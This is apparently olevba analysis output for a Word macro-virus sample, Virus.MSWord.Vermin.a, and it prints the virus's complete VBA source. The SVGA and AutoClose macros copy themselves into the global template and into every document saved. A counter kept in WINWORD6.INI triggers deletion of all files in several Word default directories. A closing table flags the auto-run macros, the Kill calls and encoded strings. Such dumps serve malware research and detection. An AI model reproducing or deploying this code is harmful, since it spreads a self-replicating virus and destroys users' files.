olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vermin.a-c44c3337b2d066383616a1c1ffbb1bf0f73f61a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SVGA 
in file: Virus.MSWord.Vermin.a-c44c3337b2d066383616a1c1ffbb1bf0f73f61a4 - OLE stream: 'SVGA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub SD()
Dim DigitC$
Dim digit
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI ")
digit = WordBasic.Val(DigitC$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", Str(digit), "WINWORD6.INI"
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "VERMIN", "WINWORD6.INI")
If DigitC$ = "3" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", "1", "WINWORD6.INI"

DigitC$ = WordBasic.[DefaultDir$](10) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](11) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](12) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](15) + "\*.*"
WordBasic.Kill DigitC$

End If
End Sub 'SD

Public Sub MAIN()
Dim MCS
Dim op
Dim ACLS
Dim Automatical
Dim sMacro$
Dim DigitC$
Dim yesno
On Error GoTo -1: On Error GoTo No

    MCS = WordBasic.CountMacros(0, 0)
    For op = 1 To MCS
        If WordBasic.[MacroName$](op, 0, 0) = "AutoClose" Then
            ACLS = -1
        End If
        If WordBasic.[MacroName$](op, 0, 0) = "SVGA" Then
            Automatical = -1
        End If
    Next op
    If Not ACLS And Not Automatical Then
        sMacro$ = WordBasic.[FileName$]() + ":SVGA"
        WordBasic.MacroCopy sMacro$, "Global:SVGA"
        sMacro$ = WordBasic.[FileName$]() + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "Global:AutoClose"
    End If
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
yesno = WordBasic.Val(DigitC$)
If Not yesno Then
    SD
End If
No:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose 
in file: Virus.MSWord.Vermin.a-c44c3337b2d066383616a1c1ffbb1bf0f73f61a4 - OLE stream: 'AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim ParaMacro$
Dim WOpen$
Dim yesno
Dim Dialogues As Object: Set Dialogues = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo No
    WordBasic.CurValues.FileSaveAs Dialogues

    If Dialogues.Format = 0 Then Dialogues.Format = 1

    ParaMacro$ = WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:SVGA", ParaMacro$
    ParaMacro$ = WordBasic.[FileName$]() + ":SVGA"
    WordBasic.MacroCopy "Global:SVGA", ParaMacro$
    ParaMacro$ = WordBasic.[FileName$]() + ":AutoClose"
    WordBasic.MacroCopy "Global:AutoClose", ParaMacro$
    WordBasic.FileSaveAs Dialogues
    GoTo Yes
No:
    If Err.Number <> 102 Then
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
yesno = WordBasic.Val(WOpen$)
If Not yesno Then
    WordBasic.FileSaveAs Dialogues
End If
    End If
Yes:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Vermin.a-c44c3337b2d066383616a1c1ffbb1bf0f73f61a4 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

